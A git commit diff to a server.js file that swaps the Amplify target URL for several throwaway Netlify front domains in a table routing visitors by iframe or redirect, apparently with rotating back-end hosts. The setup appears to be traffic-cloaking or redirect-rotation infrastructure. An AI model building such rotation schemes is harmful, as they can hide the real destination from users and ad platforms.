22d5ce5aeb3975dbb160fab8d38212aa3ae34225
naresh7km <naresh7km@gmail.com>
2026-06-24 14:04:07 +0530

    Update server.js

--- server.js
+++ server.js
@@ -109,14 +109,14 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d5io5vyki9p8t.amplifyapp.com" },
-    "https://silly-griffin-68e13a.netlify.app": { method: "iframe", target: "https://main.d5io5vyki9p8t.amplifyapp.com" },
-    "https://resplendent-donut-186798.netlify.app": { method: "iframe", target: "https://main.d5io5vyki9p8t.amplifyapp.com" },
-    "https://chipper-belekoy-fa4f48.netlify.app": { method: "iframe", target: "https://main.d5io5vyki9p8t.amplifyapp.com" },
+    "https://aquamarine-cascaron-959598.netlify.app": { method: "iframe", target: "https://main.d102pj45cuo6dw.amplifyapp.com" },
+    "https://silly-griffin-68e13a.netlify.app": { method: "iframe", target: "https://main.d102pj45cuo6dw.amplifyapp.com" },
+    "https://resplendent-donut-186798.netlify.app": { method: "iframe", target: "https://main.d102pj45cuo6dw.amplifyapp.com" },
+    "https://chipper-belekoy-fa4f48.netlify.app": { method: "iframe", target: "https://main.d102pj45cuo6dw.amplifyapp.com" },
     "https://hiroakitravels.com": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
     "https://teruogames.org": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://funny-chebakia-1d7840.netlify.app": { method: "iframe", target: "https://main.d5io5vyki9p8t.amplifyapp.com" }, // teruogames link
-    "https://silly-cucurucho-09bda3.netlify.app": { method: "iframe", target: "https://main.d5io5vyki9p8t.amplifyapp.com" }, // teruogames link
+    "https://funny-chebakia-1d7840.netlify.app": { method: "iframe", target: "https://main.d102pj45cuo6dw.amplifyapp.com" }, // teruogames link
+    "https://silly-cucurucho-09bda3.netlify.app": { method: "iframe", target: "https://main.d102pj45cuo6dw.amplifyapp.com" }, // teruogames link
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
